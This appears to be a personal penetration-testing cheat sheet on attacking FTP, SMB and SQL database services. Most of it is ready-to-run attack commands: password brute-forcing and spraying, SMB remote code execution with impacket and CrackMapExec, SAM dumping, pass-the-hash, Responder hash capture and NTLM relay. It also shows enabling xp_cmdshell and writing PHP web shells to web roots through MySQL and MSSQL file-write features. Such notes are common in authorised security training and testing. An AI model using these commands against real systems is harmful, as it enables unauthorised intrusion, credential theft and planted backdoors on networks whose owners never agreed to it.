# FTP
## Nmap
We can look for anonymous login via FTP if it's misconfigured. Included in the `-sC` option for default scripts.
```bash
nmap -p21 $target -sV -sC 
nmap ftp-anon
```

## Brute Force
We can use both Medusa or Hydra. The syntax isn't too different.
```bash
medusa -U users.list -P passwords.list -h $target -n $port
hydra -L users.list -P passwords.list ftp://$target -s $port
```
We can specify `-l` for a single user and `-p` for a single password.

## FTP Bounce attack
In short, it is querying a internet facing FTP server to gain information about the internal isolated server.

This allows us to successfully pass outbound connections and gain insights on hte internal infrastructure.

Of course, this highly depends on misconfigurations since there are protections set up by default.

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

***


# SMB

Formerly built on NetBIOS, It is a protocol designed to give shared access to files and printers over a network.

Although It is now built over TCP on port 445, but we can still encounter it on port 139. This means that the implementation
on NetBIOS.  
On the other hand, Samba is the Unix implementation of SMB. It allows Linux servres and Windows hosts to communicate with each other using the SMB protocol.

We should note that when enumerating SMB, we will often encounter the `MSRPC` protocol.

For more details you can check my [Gitbook](https://bettercheatsheets.gitbook.io)

## Nmap

```bash
nmap $target -p139,445 -sV -sC 
```
Based on the Nmap output we can limit the possible OS we're targetting. 

For example if it's a Sambda implementation, we can safely assume it's a Linux machine.

## Exploiting Null session

We can, and should, take advantage of the null session if it's available for us. This allows us to gain insights on what shares and printers
are available for us with no valid credentials.

### SMBclient
```bash
smbclient -N -L //$target
```

### SMBMap

```bash
smbmap -H $target

# Recursively lookup the directories on the specific share
smbmap -H $target -r <share> 

# Download/Upload 
smbmap -H $target --download <share>/path/to/file 
smbmap -H $target --upload <file> <share>/target/directory 

```

### MSRPC
I explained more in depth what we can do with `MSRPC` in [here](https://bettercheatsheets.gitbook.io).

Here how to login with a null session on `MSRPC`

```bash
rpcclient -U'%' $target
```
[Here](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) is a whole cheatsheet of the commands to use once we're on the MSRPC server.

### Enum4linux-ng (Automated)
Automating many default and common enumerations, as its name suggests, this can be used to gain more insights too.

```bash
./enum4linux-ng.py $target -A -C
```

## Null session not enabled

![no creds](assets/no-credentials.webp)

So, we got no creds, let's try to get/find some.

### Bruteforcing/Password Spraying
#### CrackMapExec
For non-domain joined hosts, we need to specify the `--local-auth` option.

By default, CME will quit after a succesful finding. this could be disabled with `--continue-on-success`

```bash
crackmapexec smb 10.10.110.17 -u users.list -p '<password>' --local-auth
```

## Exploiting SMB

As Microsoft always delivers, the attack vector on the Windows implementation of SMB is much significant than on Linux.


### RCE - PSExec

Simply login using the admin creds and go on further inside the machine.

```bash
impacket-psexec administrator:'<password>'$target

```

The same option applies for both `impacket-smbexec` and `impacket-atexec`.

### RCE - CrackMapExec

```bash
crackmapexec smb $target-range -u Administrator -p '<password>' -x 'whoami' --exec-method smbexec
```
This has the advantage of executing the same command on multiple hosts

>Note: If the `--exec-method` is not defined, CrackMapExec will try to execute the `atexec` method, 
if it fails you can try to specify the ``--exec-method smbexec` .
{: .prompt-warning }


### Enumerate logged-on users
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Dump SAM database
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### PassTheHash
Much more discussed in detail in previous sections.
```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


### Forced Authentication Attacks : Capture NTLM hashes

In short, we setup a fake malicious SMB server then intercept any LLMNR and NBT-NS traffic and and capture the hashes in place.

Later, we have the possibility of cracking the hashes or perform other attacks.

```bash
responder -I <interface name>
```
All the captured hashes will be stored `/usr/share/responder/logs/` which can then be cracked using hashcat mode `5600`.

#### NTLM Relay attack
In short, it is relaying the captured hash to another host on the network wihtout cracking it. 

This can be done with Responder's `multiprelay.py` or `impacket-ntlmrelayx`.

First we set `SMB=OFF` on `Responder.conf` file and then run to dump SAM :

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
Or to execute commands:
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c "PS payload"
```
***

# SQL Databases
MySQL runs on `TCP/3306` and MSSQL runs on `TCP/1433` and `UDP/1434` or on `TCP/2433` if it's running on "hidden" mode.

It is important to note that MSSQL supports two authentication types:
- Windows authentication Mode: This uses the credentials from Windows/AD which is secure and preferred.
- Mixed mode: Supports both AD and local SQL server accounts.

MySQL relies on traditional username/password login or via a Windows Authentication plugin.

Then based on the needs and usability, the admin chooses a way to login. Which is a window for misconfigurations.


## MySQL:

### Default Schema

- mysql
- information_schema
- performance_schema
- sys

### Typical path 

`show databases -> use database -> show tables -> select data`

>Look for user-defined functions in MySQL
{: .prompt-warning }
```bash
mysql -u user -p<password>-h $target 
```

### MySQL Command Execution

MySQL supports User Defined Functions which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution inthis GitHub repository. 

It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be ableto use it.

### MySQL Write File

MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET.

If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.

Here is an example:
```sql 
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

```
But, we better look for `secure_file_priv` global variable as it affect the import/export operations achieved by:

1- `LOAD DATA`
2- `SELECT ... INTO OUTFILE`
3- `LOAD_FILE()`

There are three possible values the variable can take:

1- Empty: not secure.
2- Existing Directory: we can do import/export only with the specified directory.
3- NULL = Imports/exports are disabled.

```sql 
mysql> show variables like "secure_file_priv";
```


### MySQL Read Local Files

```sql
mysql> select LOAD_FILE("/etc/passwd");
```


## MSSQL

MSSQL default schemas:
- master
- msdb
- model
- resource
- temdb


### Connecting From Windows

When using sqlcmd, we need to use `GO` to execute our query.

```cmd
C:\> sqlcmd -S SRVMSSQL -U <user> -P '<password>' -y 30 -Y 30
```

Using `-y` and `-Y` may and will affect performance. They setup up respectively the (SQLCMDMAXVARTYPEWIDTH)  (SQLCMDMAXFIXEDTYPEWIDTH) for better looking
output.

### Connecting From Linux

```bash
sqsh -S $target -U <user> -P '<password>' -h
```

Or even use impacket's `mssqlclient.py`: 

```bash
mssqlclient.py -p 1433 <user>@$target
```

>It is important to note that in order to force the Windows Authentication, we need to procide the domain or hostname.
Otherwise, it'll get interpreted as a local authentication via local accounts. 
If we're targetting a local account, here's a syntax: `sqsh -S $target -U .\\<user> -P '<password>' -h`
{: .prompt-warning }

### MSSQL Code Execution
In MSSQL we can achieve command execution through a utility called `xp_cmdshell`. 

1- Can be enabled using Policy-based mgmt or `sp_configure`
2- The process spawned has the same rights as the caller.
3- Control is back only when the process finishes execution.

The syntax is as follow: 

```text 
1> xp_cmdshell 'whoami'
2> GO

-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

>Look for more details and approaches in the `xp_cmdshell` section
{: .prompt-tip }


### MSSQL Write Local Files
We need to enable Ole Automation Procedure which requires **admin privileges**

##### MSSQL - Enable Ole Automation Procedures

```cmd
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
```cmd
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

#### MSSQL Read a File

By default, MSSQL allows file read on any file in the operating system to which the account has read access. 

```cmd 
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

```






















